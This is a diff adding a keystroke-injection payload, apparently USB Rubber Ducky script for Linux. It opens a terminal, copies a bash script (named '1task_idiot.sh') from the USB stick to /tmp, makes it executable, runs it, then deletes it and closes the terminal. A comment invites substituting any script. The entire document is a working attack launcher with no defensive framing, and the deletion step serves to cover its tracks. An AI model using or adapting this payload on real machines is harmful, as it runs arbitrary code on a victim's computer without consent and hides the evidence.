@@ -1,0 +1,32 @@
+CTRL ALT t
+DELAY 750
+STRING setxkbmap de
+ENTER
+DELAY 100
+STRING USERNAME=$(whoami)
+ENTER
+DELAY 100
+STRING MOUNT_POINT="/media/$USERNAME/$(ls /media/$USERNAME/ | head -1)"
+ENTER
+DELAY 100
+REM Change the script name below to whatever bash script you want to run from USB
+STRING SCRIPT_NAME="1task_idiot.sh"
+ENTER
+DELAY 100
+STRING cp "$MOUNT_POINT/$SCRIPT_NAME" /tmp/
+ENTER
+DELAY 200
+STRING dos2unix "/tmp/$SCRIPT_NAME" 2>/dev/null || sed -i 's/\r$//' "/tmp/$SCRIPT_NAME"
+ENTER
+DELAY 200
+STRING chmod +x "/tmp/$SCRIPT_NAME"
+ENTER
+DELAY 100
+STRING bash "/tmp/$SCRIPT_NAME"
+ENTER
+DELAY 100
+STRING rm "/tmp/$SCRIPT_NAME"
+ENTER
+DELAY 100
+STRING exit
+ENTER
